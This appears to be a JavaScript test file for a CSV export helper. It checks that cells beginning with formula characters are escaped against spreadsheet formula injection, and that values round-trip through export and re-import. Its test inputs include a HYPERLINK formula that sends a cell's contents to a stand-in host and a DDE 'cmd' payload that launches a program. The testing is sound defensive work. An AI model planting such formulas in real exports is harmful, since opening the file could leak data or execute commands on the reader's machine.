// CSV formula injection: account fields are member-writable, and a cell beginning with
// = + - @ (or tab/CR) is executed as a formula by Excel/Sheets when the export is opened.
import { test } from "node:test";
import assert from "node:assert/strict";
import { csvCell, accountsCSVText, parseCSV } from "../../src/lib/csv.js";

test("csvCell neutralises formula-leading text", () => {
  for (const v of ["=1+1", "+1", "-2+3", "@SUM(A1)", "\t=x", "\r=x", '=HYPERLINK("http://e/?"&A1)'])
    assert.ok(csvCell(v).startsWith(`"'`), v);
});

test("csvCell leaves numbers (incl. negatives) and plain text untouched", () => {
  assert.equal(csvCell(-12), '"-12"');
  assert.equal(csvCell("-12"), '"-12"');
  assert.equal(csvCell("-1.5e3"), '"-1.5e3"');
  assert.equal(csvCell("Acme"), '"Acme"');
  assert.equal(csvCell(null), '""');
  assert.equal(csvCell('say "hi"'), '"say ""hi"""');
});

test("export then re-import round-trips a formula-looking name exactly", () => {
  const name = "=cmd|' /C calc'!A0";
  const text = accountsCSVText([{ name, accountNo: 1, renewalDate: "2030-01-01", arrUSD: 5 }]);
  const [hdr, row] = parseCSV(text);
  assert.equal(row[hdr.indexOf("name")], name);
});
